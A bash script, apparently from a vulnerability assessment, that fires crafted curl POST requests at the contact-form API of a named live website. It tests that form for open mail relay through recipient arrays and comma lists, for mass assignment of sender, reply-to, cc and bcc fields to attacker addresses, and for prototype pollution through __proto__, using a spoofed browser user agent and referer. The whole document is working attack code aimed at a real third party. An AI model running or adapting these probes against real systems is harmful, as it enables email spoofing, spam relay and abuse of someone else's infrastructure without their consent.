#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
T='https://www.infinitycapital.bh'
post(){ printf "%-26s " "$1"; shift;
  curl -sk -A "$UA" -H 'Referer: https://www.infinitycapital.bh/contact' "$@" \
    -o /tmp/ma.bin -w "HTTP=%{http_code} sz=%{size_download} " -X POST "$T/api/send"
  head -c 260 /tmp/ma.bin; echo; }

echo "=== 1. valid targets (control, expect success/send) ==="
post "valid_targets" -F 'fname=D10' -F 'lname=P' -F 'areacode=0' -F 'tel=1' -F 'cname=D10' \
  -F 'subject=General' -F 'msg=vapt-probe' -F 'check=1' -F 'targets=probe@example.org'

echo "=== 2. JSON body with mass-assigned Resend params ==="
post "json_massassign" -H 'Content-Type: application/json' \
  -d '{"fname":"D10","lname":"P","areacode":"0","tel":"1","cname":"D10","subject":"General","msg":"vapt-probe","check":"1","targets":"probe@example.org","from":"attacker@evil-domain.example","reply_to":"attacker@evil-domain.example","cc":"probe@example.org","bcc":"probe@example.org"}'

echo "=== 3. targets as ARRAY (multiple recipients = relay) ==="
post "array_targets" -H 'Content-Type: application/json' \
  -d '{"fname":"D10","lname":"P","areacode":"0","tel":"1","cname":"D10","subject":"General","msg":"vapt-probe","check":"1","targets":["probe@example.org","probe2@example.org"]}'

echo "=== 4. targets[] as repeated multipart (relay via form) ==="
post "multi_targets" -F 'fname=D10' -F 'lname=P' -F 'areacode=0' -F 'tel=1' -F 'cname=D10' \
  -F 'subject=General' -F 'msg=vapt-probe' -F 'check=1' -F 'targets=a@example.org' -F 'targets=b@example.org'

echo "=== 5. comma-separated targets ==="
post "csv_targets" -F 'fname=D10' -F 'lname=P' -F 'areacode=0' -F 'tel=1' -F 'cname=D10' \
  -F 'subject=General' -F 'msg=vapt-probe' -F 'check=1' -F 'targets=a@example.org,b@example.org'

echo "=== 6. prototype pollution via __proto__ ==="
post "proto_pollution" -H 'Content-Type: application/json' \
  -d '{"fname":"D10","lname":"P","areacode":"0","tel":"1","cname":"D10","subject":"General","msg":"vapt-probe","check":"1","targets":"probe@example.org","__proto__":{"from":"attacker@evil.example"}}'
echo DONE
